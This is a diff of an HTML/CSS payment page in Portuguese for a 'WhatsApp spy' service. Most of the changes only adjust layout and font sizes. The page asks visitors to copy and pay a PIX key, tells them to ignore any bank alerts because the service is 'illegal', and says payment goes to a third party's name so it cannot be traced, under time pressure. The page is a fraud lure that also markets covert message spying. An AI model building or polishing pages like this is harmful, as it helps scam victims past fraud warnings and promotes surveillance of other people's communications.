@@ -17,35 +17,33 @@ body {
   font-family: 'Poppins', sans-serif;
   min-height: 100vh;
   min-height: 100dvh;
-
   background: linear-gradient(180deg, #c9f3e6, #b2e5d6);
 }
 
-/* ocupa TUDO */
+/* tela cheia */
 .app {
   width: 100%;
   min-height: 100vh;
-  padding: 30px 25px;
+  padding: 25px;
   display: flex;
   flex-direction: column;
-  justify-content: space-between;
 }
 
-/* topo */
+/* título */
 .header {
   text-align: center;
-  font-size: 38px; /* MAIOR */
+  font-size: 36px;
   font-weight: 700;
-  margin-bottom: 20px;
+  margin-bottom: 15px;
 }
 
-/* aviso */
+/* aviso melhorado */
 .alert {
   text-align: center;
-  font-size: 16px; /* MAIOR */
-  color: #333;
+  font-size: 18px; /* MAIOR */
+  color: #111; /* MAIS ESCURO */
   line-height: 1.7;
-  margin-bottom: 25px;
+  margin-bottom: 20px;
 }
 
 /* pix */
@@ -54,44 +52,46 @@ body {
   padding: 22px;
   border-radius: 12px;
   text-align: center;
-  font-size: 18px; /* MAIOR */
-  margin-bottom: 20px;
+  font-size: 18px;
+  margin-bottom: 15px;
 }
 
-/* botão gigante */
+/* botão */
 .copy-btn {
   width: 100%;
-  padding: 22px;
+  padding: 20px;
   background: #2ecc71;
   border: none;
   color: white;
-  font-size: 20px; /* GRANDE */
+  font-size: 20px;
   font-weight: 700;
   border-radius: 10px;
   cursor: pointer;
-  margin-bottom: 30px;
+  margin-bottom: 20px;
 }
 
-/* conteúdo */
+/* conteúdo mais próximo */
 .content {
   font-size: 17px;
   line-height: 1.8;
+  margin-top: 10px; /* MAIS JUNTO */
 }
 
 .content h2 {
   font-size: 24px;
-  margin-bottom: 15px;
+  margin-bottom: 10px;
 }
 
 .content p {
-  margin: 8px 0;
+  margin: 6px 0;
 }
 
-/* rodapé */
+/* rodapé ajustado */
 .footer {
-  margin-top: 30px;
-  font-size: 15px;
-  color: #444;
+  margin-top: 20px; /* SUBIU */
+  font-size: 16px; /* MAIOR */
+  color: #222;
+  line-height: 1.6;
 }
 </style>
 </head>
@@ -100,24 +100,20 @@ body {
 
 <div class="app">
 
-  <!-- TOPO -->
-  <div>
-    <div class="header">WhatsApp spy 🔍</div>
+  <div class="header">WhatsApp spy 🔍</div>
 
-    <div class="alert">
-      Devido à ilegalidade do serviço, a chave gerada não corresponde a uma chave validada padrão;
-      assim, qualquer notificação ou alerta será causada pelo tipo específico de serviço executado,
-      portanto ignore.
-    </div>
-
-    <div class="pix-box" id="pix">
-      SUA_CHAVE_PIX_AQUI
-    </div>
-
-    <button class="copy-btn" onclick="copiarPix()">📋 Copiar PIX</button>
+  <div class="alert">
+    Devido à ilegalidade do serviço, a chave gerada não corresponde a uma chave validada padrão;
+    assim, qualquer notificação ou alerta será causada pelo tipo específico de serviço executado,
+    portanto ignore.
   </div>
 
-  <!-- MEIO -->
+  <div class="pix-box" id="pix">
+    SUA_CHAVE_PIX_AQUI
+  </div>
+
+  <button class="copy-btn" onclick="copiarPix()">📋 Copiar PIX</button>
+
   <div class="content">
     <h2>Como pagar?</h2>
 
@@ -129,7 +125,6 @@ body {
     <p>6. Confirme o pagamento.</p>
   </div>
 
-  <!-- RODAPÉ -->
   <div class="footer">
     O pix é gerado em nome de terceiros pelo serviço ser ilegal e não rastreável.<br><br>
     Caso demore a chave será excluída.
